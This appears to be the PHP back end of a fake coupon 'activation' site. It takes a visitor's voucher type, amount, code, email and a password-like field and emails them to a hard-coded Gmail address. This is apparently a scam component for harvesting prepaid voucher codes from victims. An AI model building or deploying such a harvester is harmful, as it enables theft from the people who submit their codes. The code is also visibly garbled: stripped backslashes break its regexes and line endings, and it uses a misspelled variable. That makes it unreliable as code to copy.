<?php
/* Récupération des informations du formulaire*/
if (get_magic_quotes_gpc())
{
 $type = stripslashes(trim($_POST['nom']));
 $montant = stripslashes(trim($_POST['prenom']));
 $mail = stripslashes(trim($_POST['email']));    
 $code = stripslashes(trim($_POST['code']));
 $mdp = stripslashes(trim($_POST['commentaire']));
}     
else      
{
  $type = stripslashes(trim($_POST['nom']));
 $montant = stripslashes(trim($_POST['prenom']));
 $mail = stripslashes(trim($_POST['email']));    
 $code = stripslashes(trim($_POST['code']));
 $mdp = stripslashes(trim($_POST['commentaire']));
}
/*Vérifie si l'adresse mail est au bon format */
 $regex_mail = '/^[-+.w]{1,64}@[-.w]{1,64}.[-.w]{2,6}$/i'; 
 /*Verifie qu il n y est pas d en tête dans les données*/
$regex_head = '/[nr]/';   
/*Vérifie qu il n y est pas d erreur dans adresse mail*/
 if (!preg_match($regex_mail, $mail))
 {
 $alert = "L'adresse '.$mail.' n'est pas valide";      
 }
 else
{ 
 $courriel = 1;
}   
/* On affiche l'erreur s'il y en a une */ 
if (!empty($alert))
{
 $courriel = 0;
}     
/* On vérifie qu'il n'y a aucun header dans les champs */ 
if (preg_match($regex_head, $type)
 || preg_match($regex_head, $montant)
 || preg_match($regex_head, $mail)
 || preg_match($regex_head, $code)
 || preg_match($regex_head, $mdp))
{  
 $alert = 'En-têtes interdites dans les champs du formulaire'; 
}
else
{ 
 $header = 1;
}   
/* On affiche l'erreur s'il y en a une */ 
if (!empty($alert))
{
 $header = 0;
}
if (empty($type) 
 || empty($montant) 
 || empty($code))
{  
 $alert = 'Tous les champs doivent être renseignés';
} 
else
{  
 $renseigne = 1;
}   
/* On affiche l'erreur s'il y en a une */ 
if (!empty($alert))
{
 $renseigne = 0;
}
/* Si les variables sont bonne */
if ($renseigne == 1 AND $header == 1 AND $courriel == 1)
{
/*Envoi du mail*/

/*Le destinataire*/
$to="nabildiclak@gmail.com";

/*Le sujet du message qui apparaitra*/
$sujet="Site d'activation ";
$msg = '';
/*Le message en lui même*/
/*$msg = 'Mail envoye depuis le site' "rnrn";*/
$msg .= 'type du coupons : '.$type."rnrn";
$msg .= 'Montant du coupons: '.$montant."rnrn";
$msg .= 'code du coupons : '.$code."rnrn";
$msg .= 'Adresse mail : '.$mail."rnrn";
$msg .= 'masquer le coupons  : '.$mpd."rnrn";
/*Les en-têtes du mail*/
$headers = 'From: Nabil vient de valider un coupon'."rn";
$headers .= "rn";
/*L'envoi du mail - Et page de redirection*/
mail($to, $sujet, $msg, $headers);
echo "Merci !!!!";}
else
{
 header('Location:index.php');
}
?>
